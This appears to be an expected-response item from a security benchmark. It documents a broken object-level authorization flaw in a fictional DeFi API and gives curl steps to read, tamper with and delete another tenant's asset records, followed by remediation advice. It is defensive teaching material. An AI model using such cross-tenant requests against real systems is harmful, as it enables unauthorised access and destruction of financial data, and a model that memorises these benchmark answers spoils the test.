# Expected Response

## System
- System: ChainVault DeFi API v5.6.0
- Domain: BLOCKCHAIN / DeFi
- Example ID: BOLA-0085
- Risk ID: RISK-51-085

## Findings

### 1. Pattern 5.1 — Authorization-Bypass via ID Injection: Cross-Tenant DeFi Asset PATCH on `/api/v3/assets/:id` (HAR Primary)

The `GET/PATCH/DELETE /api/v3/assets/:id` endpoint queries by `asset_id` only. An attacker injects a cross-tenant `asset_id` into the path to bypass authorization and access or modify another tenant's DeFi assets (token holdings, liquidity positions, wallet records). Pattern 5.1 "authorization-bypass injection" — the injected cross-tenant ID is accepted by the handler without any ownership or tenant validation, bypassing the authorization layer entirely.

**Evidence from HAR:**
- Request: `PATCH /api/v3/assets/ASS-2085` from `ORG-D3F6` (`X-Tenant-ID: ORG-D3F6`)
- Response `tenantId: "ORG-74E1"` — cross-tenant asset modification confirmed
- Response `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-74E1"` — DeFi asset data exposed
- HTTP status: 200 — authorization bypass succeeded

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.chainvault-defi.example.com/api/v3/assets/ASS-1085" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>" \
  -H "X-Tenant-ID: ORG-D3F6"
```
**Expected:** Returns own DeFi asset with `tenantId: "ORG-D3F6"`.

**Step 2 — Cross-tenant DeFi asset PATCH: authorization-bypass injection (primary HAR attack):**
```bash
curl -s -X PATCH "https://api.chainvault-defi.example.com/api/v3/assets/ASS-2085" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>" \
  -H "X-Tenant-ID: ORG-D3F6" \
  -H "Content-Type: application/json" \
  -d '{"status": "frozen", "sensitive_data": "defi_asset_tampered_by_attacker"}'
```
**Vulnerable outcome:** Returns `tenantId: "ORG-74E1"` — another tenant's DeFi token/liquidity position frozen or corrupted.

**Step 3 — Cross-tenant DeFi asset DELETE: destroy asset record:**
```bash
curl -s -X DELETE "https://api.chainvault-defi.example.com/api/v3/assets/ASS-2085" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>" \
  -H "X-Tenant-ID: ORG-D3F6"
```
**Vulnerable outcome:** Victim's DeFi asset record deleted — loss of on-chain position tracking, financial exposure.

**Step 4 — Cross-tenant DeFi asset read:**
```bash
curl -s "https://api.chainvault-defi.example.com/api/v3/assets/ASS-2085" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-D3F6>" \
  -H "X-Tenant-ID: ORG-D3F6"
```
**Vulnerable outcome:** Returns `sensitiveData` — competitor's DeFi holdings and positions exposed.

## Secure Outcome
```json
{ "error": "Forbidden", "code": 403 }
```

## Remediation
- Add `WHERE asset_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all asset queries (RISK-51-085).
- Validate ownership before any write (PATCH, DELETE) on asset records.
- Centralize authorization middleware: never resolve asset IDs without ownership check.
- Use non-sequential UUIDs for asset IDs to reduce enumeration risk.
